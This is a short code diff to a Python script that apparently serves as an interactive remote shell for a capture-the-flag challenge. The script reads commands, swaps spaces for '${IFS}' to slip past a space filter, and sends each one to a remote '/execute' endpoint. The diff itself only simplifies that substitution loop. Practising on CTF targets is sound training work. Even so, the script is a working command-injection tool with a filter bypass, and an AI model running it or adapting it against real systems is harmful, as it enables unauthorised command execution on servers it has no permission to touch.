@@ -4,12 +4,7 @@ from requests import get,post
 a=0
 while a!='exit!':
 	a=input('>>> ')
-	b = ''
-	for c in a:
-		if c == ' ':
-			b += "${IFS}"
-		else:
-			b += c
+	b=a.replace(' ','${IFS}')
 	print(f'~~> {b}')
 	resp = get('https://its-broken-b2ibel8m.spbctf.ru/execute', params={'cmd':b})
 	print(resp.text)
